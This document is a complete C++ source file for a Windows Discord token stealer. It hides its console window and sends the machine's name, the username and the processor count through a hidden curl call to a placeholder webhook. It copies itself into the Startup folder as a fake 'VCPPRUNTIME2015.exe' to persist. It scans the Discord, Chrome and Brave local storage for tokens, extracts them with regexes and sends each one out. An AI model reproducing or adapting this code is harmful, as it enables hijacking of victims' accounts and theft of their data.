#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <regex>
#include <fstream>
#include <string>
#include <filesystem>
#include <Windows.h>
#include <sys/stat.h>

namespace fs = std::filesystem;

std::string webhookSend(std::string token) {

	char cmd[1024];
	sprintf(cmd, "curl -d \"content=%s\" WEBHOOKHERE", token.c_str());
	WinExec(cmd, SW_HIDE);

	return cmd;
}

std::vector<std::string> findMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
}

bool pathExists(const std::string& s)
{
	struct stat buffer;
	return (stat(s.c_str(), &buffer) == 0);
}

void sendPcInfo() {
	SYSTEM_INFO siSysInfo;
	GetSystemInfo(&siSysInfo);

	std::string szProcCount = std::to_string(siSysInfo.dwNumberOfProcessors);

	char szComputerName[1024];
	DWORD dwSize = sizeof(szComputerName);
	GetComputerNameA(szComputerName, &dwSize);

	char szUsername[1024];
	DWORD dwUser = sizeof(szUsername);
	GetUserNameA(szUsername, &dwUser);

	std::string szPc;

	szPc.append("**Computer name: ");
	szPc.append(szComputerName);
	szPc.append("**\n");
	szPc.append("**Username: ");
	szPc.append(szUsername);
	szPc.append("**\n");
	szPc.append("**Processor count: ");
	szPc.append(szProcCount);
	szPc.append("**\n");

	webhookSend(szPc);

	return;
}

int main(int argc, char* argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Computer informations

	sendPcInfo();
	Sleep(100); // Try to fix issues.


	// Bug fix: not finding tokens on computer initialization!

	const int SizeOf = sizeof(argv[0]);

	char szStartupPath[SizeOf];
	sprintf(szStartupPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));

	if (strcmp(argv[0],szStartupPath) == 0) // If in startup directory
	{
		Sleep(20000); // Wait, this should fix initialization issues.
	}


	// End bug fix.


	// Persistence

	char BUFFER[MAX_PATH];
	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
	char szPath[1024];
	char szPath2[1024];

	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));
	fs::remove(szPath);
	fs::copy(BUFFER, szPath);


	// Finding token

	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb",
		"\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb", 
		"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", 
		"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb" };


	for (int i = 0; i < installs.size(); i++) { // 
		std::string path;

		if (i > 3) {
			path = std::getenv("localappdata") + installs[i];
		}
		else {
			path = std::getenv("appdata") + installs[i];
		}

		// Temporary logging file

		char szLogFile[MAX_PATH];
		sprintf(szLogFile, "%s\\LOGS.LOG", std::getenv("appdata"));

		std::ofstream logging_file(szLogFile, std::ios::app);

		logging_file << "\nCurrent directory: " << path;

		logging_file.close();

		// End
		
		if (!pathExists(path)) {
			continue;
		}



		for (const auto& entry : fs::directory_iterator(path)) {
			std::ifstream t(entry.path(), std::ios_base::binary);

			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
			std::vector<std::string> matches;
			std::regex expression(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"); // Checksum credit for token regex.
			std::regex expression2(R"([\w-]{3}\.[\w-]{84})");

			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function


			for (int i = 0; i < regex_non_mfa.size(); i++) {
				matches.push_back(regex_non_mfa[i]);
			}

			for (int i = 0; i < regex_mfa.size(); i++) {
				matches.push_back(regex_mfa[i]);
			}

			for (int i = 0; i < matches.size(); i++) {
				webhookSend(matches[i]);
				Sleep(750);
			}
		}



	}

}
